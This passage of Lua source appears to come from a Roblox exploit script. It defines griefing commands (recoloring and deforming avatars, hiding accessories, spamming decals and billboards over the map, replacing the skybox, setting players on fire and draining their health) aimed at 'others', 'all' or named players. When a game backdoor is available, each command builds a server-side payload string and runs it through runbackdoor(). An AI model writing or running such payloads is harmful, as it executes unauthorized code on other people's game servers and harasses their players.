	if not target or target == "" or target == "me" then
		local localPlayer = game.Players.LocalPlayer
		if localPlayer then
			discoava(localPlayer)
		end
	elseif target == "random" then
		local randomPlayer = players[math.random(1, #players)]
		if randomPlayer then
			discoava(randomPlayer)
		end
	elseif target == "others" then
		local localPlayer = game.Players.LocalPlayer
		for _, player in ipairs(players) do
			if player ~= localPlayer then
				discoava(player)
			end
		end
	elseif target == "all" then
		for _, player in ipairs(players) do
			discoava(player)
		end
	else
		local found = false
		for _, player in ipairs(players) do
			if string.find(string.lower(player.Name), string.lower(target)) then
				discoava(player)
				found = true
				break
			end
		end
		if not found then
		end
	end

	if backdoor then
		local bckd = ""

		if not target or target == "" or target == "me" then
			bckd = string.format([[
                for i,v in pairs(game:GetService("Players"):GetChildren()) do 
                    if v:IsA("Player") and v.Name == "%s" then
                        local character = v.Character
                        if character then
                            while true do
                                task.wait(0.5)
                                for _, part in ipairs(character:GetChildren()) do
                                    if part:IsA("BasePart") then
                                        part.BrickColor = BrickColor.new("%s")
                                    end
                                end
                            end
                        end
                    end
                end
            ]], game.Players.LocalPlayer.Name, presets[math.random(1, #presets)])
		elseif target == "random" then
			local randomPlayer = players[math.random(1, #players)]
			if randomPlayer then
				bckd = string.format([[
                    for i,v in pairs(game:GetService("Players"):GetChildren()) do 
                        if v:IsA("Player") and v.Name == "%s" then
                            local character = v.Character
                            if character then
                                while true do
                                    task.wait(0.5)
                                    for _, part in ipairs(character:GetChildren()) do
                                        if part:IsA("BasePart") then
                                            part.BrickColor = BrickColor.new("%s")
                                        end
                                    end
                                end
                            end
                        end
                    end
                ]], randomPlayer.Name, presets[math.random(1, #presets)])
			end
		elseif target == "others" then
			bckd = string.format([[
                for i,v in pairs(game:GetService("Players"):GetChildren()) do 
                    if v:IsA("Player") and v.Name ~= "%s" then
                        local character = v.Character
                        if character then
                            while true do
                                task.wait(0.5)
                                for _, part in ipairs(character:GetChildren()) do
                                    if part:IsA("BasePart") then
                                        part.BrickColor = BrickColor.new("%s")
                                    end
                                end
                            end
                        end
                    end
                end
            ]], game.Players.LocalPlayer.Name, presets[math.random(1, #presets)])
		elseif target == "all" then
			bckd = [[
                for i,v in pairs(game:GetService("Players"):GetChildren()) do 
                    if v:IsA("Player") then
                        local character = v.Character
                        if character then
                            while true do
                                task.wait(0.5)
                                for _, part in ipairs(character:GetChildren()) do
                                    if part:IsA("BasePart") then
                                        part.BrickColor = BrickColor.new("%s")
                                    end
                                end
                            end
                        end
                    end
                end
            ]]
		else
			for _, player in ipairs(players) do
				if string.find(string.lower(player.Name), string.lower(target)) then
					bckd = string.format([[
                        for i,v in pairs(game:GetService("Players"):GetChildren()) do 
                            if v:IsA("Player") and v.Name == "%s" then
                                local character = v.Character
                                if character then
                                    while true do
                                        task.wait(0.5)
                                        for _, part in ipairs(character:GetChildren()) do
                                            if part:IsA("BasePart") then
                                                part.BrickColor = BrickColor.new("%s")
                                            end
                                        end
                                    end
                                end
                            end
                        end
                    ]], player.Name, presets[math.random(1, #presets)])
					break
				end
			end
		end

		runbackdoor(backdoor, bckd)
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("headslide", "hslide", function(target)
	local players = game:GetService("Players"):GetPlayers()
	local localPlayer = game.Players.LocalPlayer

	local function headslide(player)
		if player and player.Character and player.Character:FindFirstChild("Torso") then
			for X = 1, math.huge, 0.1 do
				task.wait()
				local neck = player.Character.Torso:FindFirstChild("Neck")
				if neck then
					neck.C0 = CFrame.new(math.sin(X) / 1, 1.5, 0)
					neck.C1 = CFrame.new(0, 0, 0)
				end
			end

			for X = 1, math.huge, 0.07 do
				task.wait()
				local neck = player.Character.Torso:FindFirstChild("Neck")
				if neck then
					neck.C0 = CFrame.new(0, 1.5, 0) * CFrame.fromAxisAngle(Vector3.new(0, 1, 0), X)
					neck.C1 = CFrame.new(0, 0, 0)
				end
			end
		end
	end

	if not backdoor then
		if not target or target == "" or target == "me" then
			if localPlayer then
				headslide(localPlayer)
			end
		elseif target == "random" then
			local randomPlayer = players[math.random(1, #players)]
			if randomPlayer then
				headslide(randomPlayer)
			end
		elseif target == "others" then
			for _, player in ipairs(players) do
				if player ~= localPlayer then
					headslide(player)
				end
			end
		elseif target == "all" then
			for _, player in ipairs(players) do
				headslide(player)
			end
		else
			for _, player in ipairs(players) do
				if string.find(string.lower(player.Name), string.lower(target)) then
					headslide(player)
				end
			end
		end
	else
		local bckd = [[
    local players = game:GetService("Players"):GetPlayers()
    local targetPlayers = {}
]]

		local localPlayer = game.Players.LocalPlayer

		if not target or target == "" or target == "me" then
			bckd = bckd .. string.format([[
        local localPlayer = game:GetService("Players"):FindFirstChild("%s")
        if localPlayer then
            table.insert(targetPlayers, localPlayer)
        end
    ]], localPlayer.Name)
		elseif target == "all" then
			bckd = bckd .. [[
        targetPlayers = players
    ]]
		elseif target == "random" then
			bckd = bckd .. [[
        table.insert(targetPlayers, players[math.random(1, #players)])
    ]]
		elseif target == "others" then
			bckd = bckd .. string.format([[
        local localPlayerName = "%s"
        for _, p in pairs(players) do
            if p.Name ~= localPlayerName then
                table.insert(targetPlayers, p)
            end
        end
    ]], localPlayer.Name)
		else
			bckd = bckd .. string.format([[
        local targetName = "%s"
        for _, p in pairs(players) do
            if string.find(string.lower(p.Name), string.lower(targetName)) then
                table.insert(targetPlayers, p)
            end
        end
    ]], target)
		end

		bckd = bckd .. [[
            for _, player in pairs(targetPlayers) do
                if player and player.Character and player.Character:FindFirstChild("Torso") then
                    coroutine.wrap(function()
                        for X = 1, math.huge, 0.1 do
                            task.wait()
                            local neck = player.Character.Torso:FindFirstChild("Neck")
                            if neck then
                                neck.C0 = CFrame.new(math.sin(X) / 1, 1.5, 0)
                                neck.C1 = CFrame.new(0, 0, 0)
                            end
                        end
                    end)()
                end
            end
        ]]

		runbackdoor(backdoor, bckd)
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("meshdisco", "mdisco", function(target)
	local meshes = {"Brick", "Cylinder", "Head", "Sphere", "Torso", "Wedge"}
	local players = game:GetService("Players"):GetPlayers()
	local localPlayer = game.Players.LocalPlayer
	local localPlayerName = localPlayer.Name

	if not backdoor then
		local function mehdisco(player)
			if player and player.Character then
				local character = player.Character
				local parts = {
					Head = character:FindFirstChild("Head"),
					Torso = character:FindFirstChild("Torso"),
					["Left Arm"] = character:FindFirstChild("Left Arm"),
					["Right Arm"] = character:FindFirstChild("Right Arm"),
					["Left Leg"] = character:FindFirstChild("Left Leg"),
					["Right Leg"] = character:FindFirstChild("Right Leg")
				}

				for _, part in pairs(parts) do
					if not part then return end
				end

				for _, part in pairs(parts) do
					if not part:FindFirstChild("Mesh") then
						Instance.new("SpecialMesh", part)
					end
				end

				task.spawn(function()
					while character.Parent do
						task.wait(0.1)
						for _, part in pairs(parts) do
							if part and part:FindFirstChild("Mesh") then
								part.Mesh.MeshType = meshes[math.random(1, #meshes)]
								part.BrickColor = BrickColor.Random()
							end
						end
					end
				end)
			end
		end

		if not target or target == "" or target == "me" then
			mehdisco(localPlayer)
		elseif target == "random" then
			local randomPlayer = players[math.random(1, #players)]
			mehdisco(randomPlayer)
		elseif target == "others" then
			for _, player in ipairs(players) do
				if player ~= localPlayer then
					mehdisco(player)
				end
			end
		elseif target == "all" then
			for _, player in ipairs(players) do
				mehdisco(player)
			end
		else
			for _, player in ipairs(players) do
				if string.find(string.lower(player.Name), string.lower(target)) then
					mehdisco(player)
				end
			end
		end
		return
	end

	local bckd = ""

	if not target or target == "" or target == "me" then
		bckd = string.format([[
            local player = game.Players:FindFirstChild("%s")
            local meshes = {"Brick", "Cylinder", "Head", "Sphere", "Torso", "Wedge"}
            
            if player and player.Character then
                local parts = {
                    Head = player.Character:FindFirstChild("Head"),
                    Torso = player.Character:FindFirstChild("Torso"),
                    ["Left Arm"] = player.Character:FindFirstChild("Left Arm"),
                    ["Right Arm"] = player.Character:FindFirstChild("Right Arm"),
                    ["Left Leg"] = player.Character:FindFirstChild("Left Leg"),
                    ["Right Leg"] = player.Character:FindFirstChild("Right Leg")
                }

                for _, part in pairs(parts) do
                    if not part then return end
                end

                for _, part in pairs(parts) do
                    if not part:FindFirstChild("Mesh") then
                        Instance.new("SpecialMesh", part)
                    end
                end

                task.spawn(function()
                    while player.Character and player.Character.Parent do
                        task.wait(0.1)
                        for _, part in pairs(parts) do
                            if part and part:FindFirstChild("Mesh") then
                                part.Mesh.MeshType = meshes[math.random(1, #meshes)]
                                part.BrickColor = BrickColor.Random()
                            end
                        end
                    end
                end)
            end
        ]], localPlayerName)
	elseif target == "random" then
		local randomPlayer = players[math.random(1, #players)]
		bckd = string.format([[
            local player = game.Players:FindFirstChild("%s")
            local meshes = {"Brick", "Cylinder", "Head", "Sphere", "Torso", "Wedge"}
            
            if player and player.Character then
                local parts = {
                    Head = player.Character:FindFirstChild("Head"),
                    Torso = player.Character:FindFirstChild("Torso"),
                    ["Left Arm"] = player.Character:FindFirstChild("Left Arm"),
                    ["Right Arm"] = player.Character:FindFirstChild("Right Arm"),
                    ["Left Leg"] = player.Character:FindFirstChild("Left Leg"),
                    ["Right Leg"] = player.Character:FindFirstChild("Right Leg")
                }

                for _, part in pairs(parts) do
                    if not part then return end
                end

                for _, part in pairs(parts) do
                    if not part:FindFirstChild("Mesh") then
                        Instance.new("SpecialMesh", part)
                    end
                end

                task.spawn(function()
                    while player.Character and player.Character.Parent do
                        task.wait(0.1)
                        for _, part in pairs(parts) do
                            if part and part:FindFirstChild("Mesh") then
                                part.Mesh.MeshType = meshes[math.random(1, #meshes)]
                                part.BrickColor = BrickColor.Random()
                            end
                        end
                    end
                end)
            end
        ]], randomPlayer.Name)
	elseif target == "others" then
		bckd = string.format([[
            local localPlayerName = "%s"
            local meshes = {"Brick", "Cylinder", "Head", "Sphere", "Torso", "Wedge"}
            
            for _, player in pairs(game:GetService("Players"):GetPlayers()) do
                if player.Name ~= localPlayerName then
                    if player and player.Character then
                        local parts = {
                            Head = player.Character:FindFirstChild("Head"),
                            Torso = player.Character:FindFirstChild("Torso"),
                            ["Left Arm"] = player.Character:FindFirstChild("Left Arm"),
                            ["Right Arm"] = player.Character:FindFirstChild("Right Arm"),
                            ["Left Leg"] = player.Character:FindFirstChild("Left Leg"),
                            ["Right Leg"] = player.Character:FindFirstChild("Right Leg")
                        }

                        for _, part in pairs(parts) do
                            if not part then goto continue end
                        end

                        for _, part in pairs(parts) do
                            if not part:FindFirstChild("Mesh") then
                                Instance.new("SpecialMesh", part)
                            end
                        end

                        task.spawn(function()
                            while player.Character and player.Character.Parent do
                                task.wait(0.1)
                                for _, part in pairs(parts) do
                                    if part and part:FindFirstChild("Mesh") then
                                        part.Mesh.MeshType = meshes[math.random(1, #meshes)]
                                        part.BrickColor = BrickColor.Random()
                                    end
                                end
                            end
                        end)
                        
                        ::continue::
                    end
                end
            end
        ]], localPlayerName)
	elseif target == "all" then
		bckd = [[
            local meshes = {"Brick", "Cylinder", "Head", "Sphere", "Torso", "Wedge"}
            
            for _, player in pairs(game:GetService("Players"):GetPlayers()) do
                if player and player.Character then
                    local parts = {
                        Head = player.Character:FindFirstChild("Head"),
                        Torso = player.Character:FindFirstChild("Torso"),
                        ["Left Arm"] = player.Character:FindFirstChild("Left Arm"),
                        ["Right Arm"] = player.Character:FindFirstChild("Right Arm"),
                        ["Left Leg"] = player.Character:FindFirstChild("Left Leg"),
                        ["Right Leg"] = player.Character:FindFirstChild("Right Leg")
                    }

                    for _, part in pairs(parts) do
                        if not part then goto continue end
                    end

                    for _, part in pairs(parts) do
                        if not part:FindFirstChild("Mesh") then
                            Instance.new("SpecialMesh", part)
                        end
                    end

                    task.spawn(function()
                        while player.Character and player.Character.Parent do
                            task.wait(0.1)
                            for _, part in pairs(parts) do
                                if part and part:FindFirstChild("Mesh") then
                                    part.Mesh.MeshType = meshes[math.random(1, #meshes)]
                                    part.BrickColor = BrickColor.Random()
                                end
                            end
                        end
                    end)
                    
                    ::continue::
                end
            end
        ]]
	else
		bckd = string.format([[
            local targetName = "%s"
            local meshes = {"Brick", "Cylinder", "Head", "Sphere", "Torso", "Wedge"}
            
            for _, player in pairs(game:GetService("Players"):GetPlayers()) do
                if string.find(string.lower(player.Name), string.lower(targetName)) then
                    if player and player.Character then
                        local parts = {
                            Head = player.Character:FindFirstChild("Head"),
                            Torso = player.Character:FindFirstChild("Torso"),
                            ["Left Arm"] = player.Character:FindFirstChild("Left Arm"),
                            ["Right Arm"] = player.Character:FindFirstChild("Right Arm"),
                            ["Left Leg"] = player.Character:FindFirstChild("Left Leg"),
                            ["Right Leg"] = player.Character:FindFirstChild("Right Leg")
                        }

                        for _, part in pairs(parts) do
                            if not part then goto continue end
                        end

                        for _, part in pairs(parts) do
                            if not part:FindFirstChild("Mesh") then
                                Instance.new("SpecialMesh", part)
                            end
                        end

                        task.spawn(function()
                            while player.Character and player.Character.Parent do
                                task.wait(0.1)
                                for _, part in pairs(parts) do
                                    if part and part:FindFirstChild("Mesh") then
                                        part.Mesh.MeshType = meshes[math.random(1, #meshes)]
                                        part.BrickColor = BrickColor.Random()
                                    end
                                end
                            end
                        end)
                        
                        ::continue::
                    end
                end
            end
        ]], target)
	end

	if bckd ~= "" then
		runbackdoor(backdoor, bckd)
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("accessoryless", "aless", function(target)
	function settrans(player, transparency)
		if player and player.Character then
			local character = player.Character
			for _, accessory in pairs(character:GetChildren()) do
				if accessory:IsA("Accessory") then
					local handle = accessory:FindFirstChild("Handle")
					if handle then
						handle.Transparency = transparency
					end
				end
			end
		end
	end

	local players = game:GetService("Players"):GetPlayers()
	local localPlayer = game.Players.LocalPlayer

	if not target or target == "" or target == "me" then
		if localPlayer then
			settrans(localPlayer, 1)
		end
	elseif target == "random" then
		local randomPlayer = players[math.random(1, #players)]
		settrans(randomPlayer, 1)
	elseif target == "others" then
		for _, player in ipairs(players) do
			if player ~= localPlayer then
				settrans(player, 1)
			end
		end
	elseif target == "all" then
		for _, player in ipairs(players) do
			settrans(player, 1)
		end
	else
		for _, player in ipairs(players) do
			if string.find(string.lower(player.Name), string.lower(target)) then
				settrans(player, 1)
			end
		end
	end

	if backdoor then
		local bckd = ""

		if not target or target == "" or target == "me" then
			bckd = [[
                local player = game.Players.LocalPlayer
                if player and player.Character then
                    for _, accessory in pairs(player.Character:GetChildren()) do
                        if accessory:IsA("Accessory") then
                            local handle = accessory:FindFirstChild("Handle")
                            if handle then
                                handle.Transparency = 1
                            end
                        end
                    end
                end
            ]]
		elseif target == "random" then
			local randomPlayer = players[math.random(1, #players)]
			bckd = string.format([[
                local player = game:GetService("Players"):FindFirstChild("%s")
                if player and player.Character then
                    for _, accessory in pairs(player.Character:GetChildren()) do
                        if accessory:IsA("Accessory") then
                            local handle = accessory:FindFirstChild("Handle")
                            if handle then
                                handle.Transparency = 1
                            end
                        end
                    end
                end
            ]], randomPlayer.Name)
		elseif target == "others" then
			bckd = string.format([[
                local localPlayerName = "%s"
                for _, player in pairs(game:GetService("Players"):GetPlayers()) do
                    if player.Name ~= localPlayerName then
                        if player.Character then
                            for _, accessory in pairs(player.Character:GetChildren()) do
                                if accessory:IsA("Accessory") then
                                    local handle = accessory:FindFirstChild("Handle")
                                    if handle then
                                        handle.Transparency = 1
                                    end
                                end
                            end
                        end
                    end
                end
            ]], localPlayer.Name)
		elseif target == "all" then
			bckd = [[
                for _, player in pairs(game:GetService("Players"):GetPlayers()) do
                    if player.Character then
                        for _, accessory in pairs(player.Character:GetChildren()) do
                            if accessory:IsA("Accessory") then
                                local handle = accessory:FindFirstChild("Handle")
                                if handle then
                                    handle.Transparency = 1
                                end
                            end
                        end
                    end
                end
            ]]
		else
			bckd = string.format([[
                local targetName = "%s"
                for _, player in pairs(game:GetService("Players"):GetPlayers()) do
                    if string.find(string.lower(player.Name), string.lower(targetName)) then
                        if player.Character then
                            for _, accessory in pairs(player.Character:GetChildren()) do
                                if accessory:IsA("Accessory") then
                                    local handle = accessory:FindFirstChild("Handle")
                                    if handle then
                                        handle.Transparency = 1
                                    end
                                end
                            end
                        end
                    end
                end
            ]], target)
		end

		if bckd ~= "" then
			runbackdoor(backdoor, bckd)
		end
	end
end)

addcommand("unaccessoryless", "unaless", function(target)
	function settrans(player, transparency)
		if player and player.Character then
			local character = player.Character
			for _, accessory in pairs(character:GetChildren()) do
				if accessory:IsA("Accessory") then
					local handle = accessory:FindFirstChild("Handle")
					if handle then
						handle.Transparency = transparency
					end
				end
			end
		end
	end

	local players = game:GetService("Players"):GetPlayers()
	local localPlayer = game.Players.LocalPlayer

	if not target or target == "" or target == "me" then
		if localPlayer then
			settrans(localPlayer, 0)
		end
	elseif target == "random" then
		local randomPlayer = players[math.random(1, #players)]
		settrans(randomPlayer, 0)
	elseif target == "others" then
		for _, player in ipairs(players) do
			if player ~= localPlayer then
				settrans(player, 0)
			end
		end
	elseif target == "all" then
		for _, player in ipairs(players) do
			settrans(player, 0)
		end
	else
		for _, player in ipairs(players) do
			if string.find(string.lower(player.Name), string.lower(target)) then
				settrans(player, 0)
			end
		end
	end

	if backdoor then
		local bckd = ""

		if not target or target == "" or target == "me" then
			bckd = [[
                local player = game.Players.LocalPlayer
                if player and player.Character then
                    for _, accessory in pairs(player.Character:GetChildren()) do
                        if accessory:IsA("Accessory") then
                            local handle = accessory:FindFirstChild("Handle")
                            if handle then
                                handle.Transparency = 0
                            end
                        end
                    end
                end
            ]]
		elseif target == "random" then
			local randomPlayer = players[math.random(1, #players)]
			bckd = string.format([[
                local player = game:GetService("Players"):FindFirstChild("%s")
                if player and player.Character then
                    for _, accessory in pairs(player.Character:GetChildren()) do
                        if accessory:IsA("Accessory") then
                            local handle = accessory:FindFirstChild("Handle")
                            if handle then
                                handle.Transparency = 0
                            end
                        end
                    end
                end
            ]], randomPlayer.Name)
		elseif target == "others" then
			bckd = string.format([[
                local localPlayerName = "%s"
                for _, player in pairs(game:GetService("Players"):GetPlayers()) do
                    if player.Name ~= localPlayerName then
                        if player.Character then
                            for _, accessory in pairs(player.Character:GetChildren()) do
                                if accessory:IsA("Accessory") then
                                    local handle = accessory:FindFirstChild("Handle")
                                    if handle then
                                        handle.Transparency = 0
                                    end
                                end
                            end
                        end
                    end
                end
            ]], localPlayer.Name)
		elseif target == "all" then
			bckd = [[
                for _, player in pairs(game:GetService("Players"):GetPlayers()) do
                    if player.Character then
                        for _, accessory in pairs(player.Character:GetChildren()) do
                            if accessory:IsA("Accessory") then
                                local handle = accessory:FindFirstChild("Handle")
                                if handle then
                                    handle.Transparency = 0
                                end
                            end
                        end
                    end
                end
            ]]
		else
			bckd = string.format([[
                local targetName = "%s"
                for _, player in pairs(game:GetService("Players"):GetPlayers()) do
                    if string.find(string.lower(player.Name), string.lower(targetName)) then
                        if player.Character then
                            for _, accessory in pairs(player.Character:GetChildren()) do
                                if accessory:IsA("Accessory") then
                                    local handle = accessory:FindFirstChild("Handle")
                                    if handle then
                                        handle.Transparency = 0
                                    end
                                end
                            end
                        end
                    end
                end
            ]], target)
		end

		if bckd ~= "" then
			runbackdoor(backdoor, bckd)
		end
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("decalspam", "dspam", function(imageId)
	imageId = imageId

	function removdecalz(root)
		for _, v in pairs(root:GetChildren()) do
			if v:IsA("Decal") then
				v:Destroy()
			elseif v:IsA("BasePart") then
				for _, child in pairs(v:GetChildren()) do
					if child:IsA("Decal") then
						child:Destroy()
					end
				end
			end
			removdecalz(v)
		end
	end

	local function spam(root)
		for _, v in pairs(root:GetChildren()) do
			if v:IsA("BasePart") then
				v.Material = "Plastic"
				local One = Instance.new("Decal", v)
				local Two = Instance.new("Decal", v)
				local Three = Instance.new("Decal", v)
				local Four = Instance.new("Decal", v)
				local Five = Instance.new("Decal", v)
				local Six = Instance.new("Decal", v)
				One.Texture = "rbxassetid://" .. imageId
				Two.Texture = "rbxassetid://" .. imageId
				Three.Texture = "rbxassetid://" .. imageId
				Four.Texture = "rbxassetid://" .. imageId
				Five.Texture = "rbxassetid://" .. imageId
				Six.Texture = "rbxassetid://" .. imageId
				One.Face = "Front"
				Two.Face = "Back"
				Three.Face = "Right"
				Four.Face = "Left"
				Five.Face = "Top"
				Six.Face = "Bottom"
			end
			spam(v)
		end
	end

	local function removdecal(root)
		for _, v in pairs(root:GetChildren()) do
			removdecal(v)
		end
	end

	if not backdoor then
		spawn(function()
			removdecal(game.Workspace)
			spam(game.Workspace)
		end)
	end

	if backdoor then
		local bckd = string.format([[
            local imageId = "%s"

            function removdecalz(root)
                for _, v in pairs(root:GetChildren()) do
                    if v:IsA("Decal") then
                        v:Destroy()
                    elseif v:IsA("BasePart") then
                        for _, child in pairs(v:GetChildren()) do
                            if child:IsA("Decal") then
                                child:Destroy()
                            end
                        end
                    end
                    removdecalz(v)
                end
            end

            function spam(root)
                for _, v in pairs(root:GetChildren()) do
                    if v:IsA("BasePart") then
                        v.Material = "Plastic"
                        local One = Instance.new("Decal", v)
                        local Two = Instance.new("Decal", v)
                        local Three = Instance.new("Decal", v)
                        local Four = Instance.new("Decal", v)
                        local Five = Instance.new("Decal", v)
                        local Six = Instance.new("Decal", v)
                        One.Texture = "rbxassetid://" .. imageId
                        Two.Texture = "rbxassetid://" .. imageId
                        Three.Texture = "rbxassetid://" .. imageId
                        Four.Texture = "rbxassetid://" .. imageId
                        Five.Texture = "rbxassetid://" .. imageId
                        Six.Texture = "rbxassetid://" .. imageId
                        One.Face = "Front"
                        Two.Face = "Back"
                        Three.Face = "Right"
                        Four.Face = "Left"
                        Five.Face = "Top"
                        Six.Face = "Bottom"
                    end
                    spam(v)
                end
            end

            removdecalz(game.Workspace)
            spam(game.Workspace)
        ]], imageId)

		runbackdoor(backdoor, bckd)
	end
end)

--------------------------------------------------------------------------------------------------------------

addcommand("billboardspam", "bbspam", function(imageId)
	imageId = imageId

	function billbord(part)
		if part:FindFirstChildOfClass("BillboardGui") then return end

		local billboardGui = Instance.new("BillboardGui")
		billboardGui.Size = UDim2.new(3, 0, 3, 0)
		billboardGui.AlwaysOnTop = true
		billboardGui.Parent = part
		billboardGui.Adornee = part

		local imageLabel = Instance.new("ImageLabel")
		imageLabel.Size = UDim2.new(1, 0, 1, 0)
		imageLabel.Image = "rbxassetid://" .. imageId
		imageLabel.BackgroundTransparency = 1
		imageLabel.Parent = billboardGui
	end

	local function addbillbord()
		for _, descendant in pairs(workspace:GetDescendants()) do
			if descendant:IsA("BasePart") then
				billbord(descendant)
			end
		end

		workspace.DescendantAdded:Connect(function(newDescendant)
			if newDescendant:IsA("BasePart") then
				billbord(newDescendant)
			end
		end)
	end

	if not backdoor then
		spawn(function()
			addbillbord()
		end)
	end

	if backdoor then
		local bckd = string.format([[
            local imageId = "%s"

            function billbord(part)
                if part:FindFirstChildOfClass("BillboardGui") then return end

                local billboardGui = Instance.new("BillboardGui")
                billboardGui.Size = UDim2.new(3, 0, 3, 0)
                billboardGui.AlwaysOnTop = true
                billboardGui.Parent = part
                billboardGui.Adornee = part

                local imageLabel = Instance.new("ImageLabel")
                imageLabel.Size = UDim2.new(1, 0, 1, 0)
                imageLabel.Image = "rbxassetid://" .. imageId
                imageLabel.BackgroundTransparency = 1
                imageLabel.Parent = billboardGui
            end

            function addbillbord()
                for _, descendant in pairs(workspace:GetDescendants()) do
                    if descendant:IsA("BasePart") then
                        billbord(descendant)
                    end
                end

                workspace.DescendantAdded:Connect(function(newDescendant)
                    if newDescendant:IsA("BasePart") then
                        billbord(newDescendant)
                    end
                end)
            end

            addbillbord()
        ]], imageId)

		runbackdoor(backdoor, bckd)
	end
end)

--------------------------------------------------------------------------------------------------------------

addcommand("replaceskybox", "sky", function(imageId)
	imageId = imageId or ""

	local function repsky()
		local lighting = game:GetService("Lighting")

		local oldSky = lighting:FindFirstChildOfClass("Sky")
		if oldSky then
			oldSky:Destroy()
			wait()
		end

		local sky = Instance.new("Sky")
		sky.SkyboxBk = "rbxassetid://" .. imageId
		sky.SkyboxDn = "rbxassetid://" .. imageId
		sky.SkyboxFt = "rbxassetid://" .. imageId
		sky.SkyboxLf = "rbxassetid://" .. imageId
		sky.SkyboxRt = "rbxassetid://" .. imageId
		sky.SkyboxUp = "rbxassetid://" .. imageId
		sky.Parent = lighting
	end

	if not backdoor then
		spawn(repsky)
	else
		local bckd = string.format([[
            local imageId = "%s"
            
            local lighting = game:GetService("Lighting")
            local oldSky = lighting:FindFirstChildOfClass("Sky")
            if oldSky then
                oldSky:Destroy()
                task.wait()
            end
            
            local sky = Instance.new("Sky")
            sky.SkyboxBk = "rbxassetid://" .. imageId
            sky.SkyboxDn = "rbxassetid://" .. imageId
            sky.SkyboxFt = "rbxassetid://" .. imageId
            sky.SkyboxLf = "rbxassetid://" .. imageId
            sky.SkyboxRt = "rbxassetid://" .. imageId
            sky.SkyboxUp = "rbxassetid://" .. imageId
            sky.Parent = lighting
        ]], imageId)

		runbackdoor(backdoor, bckd)
	end
end)

--------------------------------------------------------------------------------------------------------------

addcommand("fire", "fire", function(target)
	local fyecol = Color3.fromHex("4051ED")
	local secfyecol = Color3.fromHex("99a3ff")
	local players = game:GetService("Players"):GetPlayers()
	local localPlayer = game.Players.LocalPlayer

	if not backdoor then
		local function fiyah(player)
			if player and player.Character then
				local character = player.Character
				local humanoid = character:FindFirstChildOfClass("Humanoid")

				if humanoid then
					for _, part in pairs(character:GetChildren()) do
						if part:IsA("BasePart") then
							for _, existingFire in ipairs(part:GetChildren()) do
								if existingFire:IsA("Fire") then
									existingFire:Destroy()
								end
							end
						end
					end

					for _, part in pairs(character:GetChildren()) do
						if part:IsA("BasePart") then
							local fire = Instance.new("Fire")
							fire.Size = 10
							fire.Heat = 1
							fire.Color = fyecol
							fire.SecondaryColor = secfyecol
							fire.Parent = part
						end
					end

					task.spawn(function()
						while humanoid and humanoid.Health > 0 and character.Parent do
							humanoid.Health = humanoid.Health - 20
							task.wait(0.5)
						end
					end)
				end
			end
		end

		if not target or target == "" or target == "me" then
			fiyah(localPlayer)
		elseif target == "random" then
			if #players > 0 then
				local randomPlayer = players[math.random(1, #players)]
				fiyah(randomPlayer)
			end
		elseif target == "others" then
			for _, player in ipairs(players) do
				if player ~= localPlayer then
					task.spawn(function() fiyah(player) end)
				end
			end
		elseif target == "all" then
			for _, player in ipairs(players) do
				task.spawn(function() fiyah(player) end)
			end
		else
			for _, player in ipairs(players) do
				if string.find(string.lower(player.Name), string.lower(target)) then
					fiyah(player)
					break
				end
			end
		end
		return
	end

	local localPlayerName = localPlayer.Name
	local bckd = ""

	if not target or target == "" or target == "me" then
		bckd = string.format([[
            local player = game.Players:FindFirstChild("%s")
            local fyecol = Color3.fromRGB(64, 81, 237)
            local secfyecol = Color3.fromRGB(153, 163, 255)
            
            if player and player.Character then
                local character = player.Character
                local humanoid = character:FindFirstChildOfClass("Humanoid")
                
                if humanoid then
                    for _, part in pairs(character:GetChildren()) do
                        if part:IsA("BasePart") then
                            for _, existingFire in ipairs(part:GetChildren()) do
                                if existingFire:IsA("Fire") then
                                    existingFire:Destroy()
                                end
                            end
                        end
                    end
                    
                    for _, part in pairs(character:GetChildren()) do
                        if part:IsA("BasePart") then
                            local fire = Instance.new("Fire")
                            fire.Size = 10
                            fire.Heat = 1
                            fire.Color = fyecol
                            fire.SecondaryColor = secfyecol
                            fire.Parent = part
                        end
                    end
                    
                    task.spawn(function()
                        while humanoid and humanoid.Health > 0 and character.Parent do
                            humanoid.Health = humanoid.Health - 20
                            task.wait(0.5)
                        end
                    end)
                end
            end
        ]], localPlayerName)
	elseif target == "random" then
		local randomPlayer = players[math.random(1, #players)]
		bckd = string.format([[
            local player = game.Players:FindFirstChild("%s")
            local fyecol = Color3.fromRGB(64, 81, 237)
            local secfyecol = Color3.fromRGB(153, 163, 255)
            
            if player and player.Character then
                local character = player.Character
                local humanoid = character:FindFirstChildOfClass("Humanoid")
                
                if humanoid then
                    for _, part in pairs(character:GetChildren()) do
                        if part:IsA("BasePart") then
                            for _, existingFire in ipairs(part:GetChildren()) do
                                if existingFire:IsA("Fire") then
                                    existingFire:Destroy()
                                end
                            end
                        end
                    end
                    
                    for _, part in pairs(character:GetChildren()) do
                        if part:IsA("BasePart") then
                            local fire = Instance.new("Fire")
                            fire.Size = 10
                            fire.Heat = 1
                            fire.Color = fyecol
                            fire.SecondaryColor = secfyecol
                            fire.Parent = part
                        end
                    end
                    
                    task.spawn(function()
                        while humanoid and humanoid.Health > 0 and character.Parent do
                            humanoid.Health = humanoid.Health - 20
                            task.wait(0.5)
                        end
                    end)
                end
            end
        ]], randomPlayer.Name)
	elseif target == "others" then
		bckd = string.format([[
            local localPlayerName = "%s"
            local fyecol = Color3.fromRGB(64, 81, 237)
            local secfyecol = Color3.fromRGB(153, 163, 255)
            
            for _, player in pairs(game:GetService("Players"):GetPlayers()) do
                if player.Name ~= localPlayerName then
                    if player and player.Character then
                        local character = player.Character
                        local humanoid = character:FindFirstChildOfClass("Humanoid")
                        
                        if humanoid then
                            for _, part in pairs(character:GetChildren()) do
                                if part:IsA("BasePart") then
                                    for _, existingFire in ipairs(part:GetChildren()) do
                                        if existingFire:IsA("Fire") then
                                            existingFire:Destroy()
                                        end
                                    end
                                end
                            end
                            
                            for _, part in pairs(character:GetChildren()) do
                                if part:IsA("BasePart") then
                                    local fire = Instance.new("Fire")
                                    fire.Size = 10
                                    fire.Heat = 1
                                    fire.Color = fyecol
                                    fire.SecondaryColor = secfyecol
                                    fire.Parent = part
                                end
                            end
                            
                            task.spawn(function()
                                while humanoid and humanoid.Health > 0 and character.Parent do
                                    humanoid.Health = humanoid.Health - 20
                                    task.wait(0.5)
                                end
                            end)
                        end
                    end
                end
            end
        ]], localPlayerName)
